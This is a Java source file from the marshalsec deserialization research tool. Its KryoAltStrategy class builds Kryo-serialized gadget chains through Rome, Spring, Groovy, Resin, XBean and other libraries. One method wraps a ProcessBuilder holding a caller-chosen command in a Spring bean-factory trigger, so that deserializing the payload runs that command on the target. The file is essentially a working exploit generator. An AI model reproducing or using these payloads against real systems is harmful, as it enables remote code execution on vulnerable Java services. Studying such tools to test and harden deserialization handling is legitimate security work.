/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package marshalsec;


import org.objenesis.strategy.StdInstantiatorStrategy;

import marshalsec.gadgets.Args;
import marshalsec.gadgets.BindingEnumeration;
import marshalsec.gadgets.Groovy;
import marshalsec.gadgets.ImageIO;
import marshalsec.gadgets.LazySearchEnumeration;
import marshalsec.gadgets.Resin;
import marshalsec.gadgets.Rome;
import marshalsec.gadgets.ServiceLoader;
import marshalsec.gadgets.SpringPartiallyComparableAdvisorHolder;
import marshalsec.gadgets.SpringUtil;
import marshalsec.gadgets.XBean;


/**
 * 
 * Not applicable:
 * - ImageIO: cannot restore method
 * 
 * @author mbechler
 *
 */
public class KryoAltStrategy extends Kryo implements Rome, SpringPartiallyComparableAdvisorHolder, Groovy, Resin, LazySearchEnumeration,
        BindingEnumeration, ServiceLoader, ImageIO, XBean {

    /**
     * {@inheritDoc}
     *
     * @see marshalsec.Kryo#makeKryo()
     */
    @Override
    protected com.esotericsoftware.kryo.Kryo makeKryo () {
        com.esotericsoftware.kryo.Kryo k = super.makeKryo();
        k.setInstantiatorStrategy(new com.esotericsoftware.kryo.Kryo.DefaultInstantiatorStrategy(new StdInstantiatorStrategy()));
        return k;
    }


    /**
     * Example with default bean factory method trigger instead, alt strategy required for ProcessBuilder
     */
    @Args ( minArgs = 1, args = {
        "cmd", "args..."
    }, defaultArgs = {
        MarshallerBase.defaultExecutable
    } )
    @Override
    public Object makeBeanFactoryPointcutAdvisor ( UtilFactory uf, String[] args ) throws Exception {
        return SpringUtil
                .makeBeanFactoryTriggerBFPA(uf, "caller", SpringUtil.makeMethodTrigger(new ProcessBuilder(args), "start"));
    }


    public static void main ( String[] args ) {
        new KryoAltStrategy().run(args);
    }
}
